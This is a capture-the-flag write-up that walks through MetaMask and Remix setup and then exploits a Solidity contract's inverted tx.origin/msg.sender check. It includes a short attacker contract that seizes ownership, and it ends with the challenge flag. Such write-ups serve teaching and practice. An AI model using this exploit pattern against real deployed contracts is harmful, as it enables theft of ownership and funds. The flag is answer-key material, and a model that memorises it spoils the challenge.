# Writeup: UnknownOrigin

## Challenge Description

> It's not always about where you're going, sometimes it's about where you're
> coming from.

## Setup + Solution

This most difficult part of the challenge was the setup of the environment, so
in this writeup I'll be going over the connection to MetaMask & the Remix IDE.
The actual exploitation is (in my opinion) much easier.  

## Setup  
### Setting up MetaMask

In order to connect to the challenge network, you'll have to add a new network
to [Metamask](https://metamask.io/). The challenge help section has a detailed
instruction on how to connect MetaMask to the network. I'll also list it
below:

```  
To start playing the challenges you will need the MetaMask browser extension.  
Once you have MetaMask you will need to connect to the network, create an
account and get some Ether.  
MetaMask -> (Icon top right) -> Settings -> Networks -> Add Network:  
Network Name: "CTF Network" (Can be whatever you like)  
New RPC URL: http(s)://{SERVER}:8545  
Chain ID: 1337  
MetaMask -> (Icon top right) -> Create Account  
You can claim Ether one time per account on the "Register" page. Copy the
public key of your account from MetaMask to the text field and click "Get
Ether".  
```  
__Note: When adding the network, MetaMask could tell you that `This URL is
currently used by the localhost network.` or `This Chain ID is currently used
by the localhost network.` You can enter the RPC URL as
`http://localhost:8545/` and ignore the Chain ID. As long as the network can
still be created by clicking `Save`, you're all good.__

To verify that you're connected to the network, check that the NetMask
extension shows a green light next to your account with the text `Connected`.

![Metamask Connected](https://raw.githubusercontent.com/edcod3/ctf-
writeups/master/CyberSecurityRumble/eth/UnknownOrigin/metamask_connected.png
"Metamask Connected")

Additionally, you can check in the browser console of the page by entering
`player`.

```js  
> player  
'{YOUR_ETH_ADDRESS}'  
```

Next, you can add the ETH to your account by following the above instructions
from the help section.

Now you should see that 10 ETH has been added to your account.

![Challenge Registration](https://raw.githubusercontent.com/edcod3/ctf-
writeups/master/CyberSecurityRumble/eth/UnknownOrigin/challenge_register.png
"Challenge Registration")

Now we can start with the challenge!

### The challenge

After creating the instance & confirming the level creation of MetaMask, we
can have a look at the contract.

`UnknownOrigin.sol`  
```js  
// SPDX-License-Identifier: MIT  
pragma solidity ^0.6.0;

contract UnknownOrigin {  
   address public owner;

   constructor() public {  
         owner = msg.sender;  
   }  
  
   modifier onlyOwned () {  
         require(msg.sender != tx.origin);  
         _;  
   }

   function updateOwner (address _newOwner) public onlyOwned {  
         owner = _newOwner;  
   }  
}  
```

As stated on the challenge page, our goal is to `Claim ownership of the
contract to win.` \  
We can see that during the creation of the contract, the owner is set to the
contract or person that called the contract. \  
If we enter `await contract.owner()` we can see current owner of the contract.

```js  
> await contract.owner();  
'{CURRENT_OWNER_ADDRESS}'  
```

If we compare the owner address to our address, we can see that they differ,
so our goal is to make us the owner of the contract (as stated in the
challenge prompt).  
\  
\  
How can we set the owner? Conveniently, the contract has a `updateOwner`
function that sets the owner to whatever address we specify. \  
If we try to call the `updateOwner` function in the browser console, we will
get a bunch of error messages.

```js  
> await contract.updateOwner(player);  
'Error in RPC response:,Internal JSON-RPC error.'  
...  
```

This is because we didn't satisfy the modifier `onlyOwned`, which is a
prerequisite check to make sure that "only" the owner can call the
`updateOwner` function. The modifier checks if the caller of the contract
(`msg.sender`) isn't equal to the origin of the transaction (`tx.origin`). \  
So how can we bypass this check & call `updateOwner`? For this we'll have to
figure out what the difference is between `msg.sender` & `tx.origin`. \  
When googling for the difference between the two, I stumbled upon this
[writeup](https://medium.com/@nicolezhu/ethernaut-lvl-4-walkthrough-how-to-
abuse-tx-origin-msg-sender-ef37d6751c8) for the Ethernaut (Level 4) challenge.
This challenge basically identical to our challenge & I advise you to read the
whole writeup (it isn't very long).\  
\  
But in essence we can exploit the following:  
- `tx.origin` can only be a (user) wallet address and __not__ a contract address.  
- `msg.sender` can be a (user) wallet address and/or a contract address.

So our exploit plan will be as follows.  
1. Create a new contract which calls the `UnkownOrigin` address  
2. Call the `updateOwner` function in our (attacker) contract with our wallet address.

Thus `tx.origin` will be set to our wallet address and `msg.sender` will be
set to our (attacker) contract, bypassing the check in the target
(`UnknownOrigin`) contract.

### Creating & Deploying a malicious contract

I'll be using [Remix](http://remix.ethereum.org/) to create & deploy our
malicious contract.

Let's first setup our workspace in Remix.

Remix will create some template contracts (in the `./contracts/` directory).
These can either be ingored or deleted, whatever floats your boat.

Now we can create our .sol files. First, create a `UnknownOrigin.sol` file in
the contracts directory and copy/paste the challenge code:

```js  
// SPDX-License-Identifier: MIT  
pragma solidity ^0.6.0;

contract UnknownOrigin {  
   address public owner;

   constructor() public {  
         owner = msg.sender;  
   }  
  
   modifier onlyOwned () {  
         require(msg.sender != tx.origin);  
         _;  
   }

   function updateOwner (address _newOwner) public onlyOwned {  
         owner = _newOwner;  
   }  
}  
```  
Now we can create our malicious contract.

As detailed before, we want to call the `UnknownOrigin` contract from our
contract, so we will have to import it into our script. Additionally, we will
create a function which calls the `updateOwner` function in the target
contract.

Knowing this, I created the malicious contract `AttackerOrigin`:

`AttackerOrigin.sol`

```js  
// SPDX-License-Identifier: MIT  
pragma solidity ^0.6.0;

import "./UnknownOrigin.sol";

contract AttackerOrigin {  
   UnknownOrigin public unknownOrigin =
UnknownOrigin(YOUR_CHALLENGE_CONTRACT_ADDRESS);

   function attackOwner(address _owner) public {  
       unknownOrigin.updateOwner(_owner);  
   }

}  
```  
The Remix workspace should now look similar to this:

![Remix Workspace](https://raw.githubusercontent.com/edcod3/ctf-
writeups/master/CyberSecurityRumble/eth/UnknownOrigin/remix_workspace.png
"Remix Workspace")

Now that we created our malicious contract, let's deploy it.

Before deploying we will have to compile it, which can be done by navigating
to the Solidity compiler in the sidebar & clicking Compile. \  
_Make sure you have the malicious .sol file selected in the Remix file
explorer._

Now we can deploy the contract! \  
Navigate to the deploy section in the sidebar & select `Injected Web3` as your
environment (make sure that metamask is connected to the Remix Site). Next,
make sure the address & contract is correct and can press `Deploy`. \  
The contract has been deployed & it should be visible in the `Deployed
Contracts` dropdown menu.  
We can now change the owner of the `UnknownOrigin` contract by pasting our
(user) address into the `_owner` field & pressing the `attackOwner` button.

The transaction should successfully be mined & executed, making us the owner
of the target contract!  
![Deploy Contract](https://raw.githubusercontent.com/edcod3/ctf-
writeups/master/CyberSecurityRumble/eth/UnknownOrigin/remix_contract_deploy.png
"Deploy Contract")

We can double-check this by going to the challenge page & checking the owner
of the contract with our user address.

```js  
> await contract.owner() == player  
true  
```

We can now submit the instance, sign the message & get the flag.

## Flag: CSR{0r1gn4l_M5g_123_x}

Original writeup (https://github.com/edcod3/ctf-
writeups/blob/master/CyberSecurityRumble/eth/UnknownOrigin/UnknownOrigin.md).